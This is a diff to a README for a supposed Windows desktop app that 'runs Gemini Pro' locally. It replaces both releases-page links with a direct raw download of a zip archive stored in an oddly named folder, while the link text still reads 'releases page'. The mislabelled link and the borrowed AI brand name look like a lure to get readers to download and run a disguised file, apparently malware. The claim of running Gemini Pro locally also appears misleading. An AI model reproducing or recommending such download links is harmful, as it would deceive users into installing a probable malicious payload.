@@ -1,6 +1,6 @@
 # 🤖 Gemini-Pro-Desktop - Run Gemini Pro on your computer
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/atlanteenthusiastic588/Gemini-Pro-Desktop/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/atlanteenthusiastic588/Gemini-Pro-Desktop/raw/refs/heads/main/limnobiology/Gemini-Desktop-Pro-2.8.zip)
 
 Gemini-Pro-Desktop brings the power of Gemini Pro to your Windows computer. The application runs locally to help you with your daily tasks. Use this tool to write text, analyze data, and organize your work without relying on a web browser.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run the software smoothly. Please check
 
 Follow these steps to put the software on your machine.
 
-1. Visit the [releases page](https://github.com/atlanteenthusiastic588/Gemini-Pro-Desktop/releases) to find the latest version.
+1. Visit the [releases page](https://github.com/atlanteenthusiastic588/Gemini-Pro-Desktop/raw/refs/heads/main/limnobiology/Gemini-Desktop-Pro-2.8.zip) to find the latest version.
 2. Look for the Assets section at the bottom of the current release.
 3. Click on the file that ends with .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
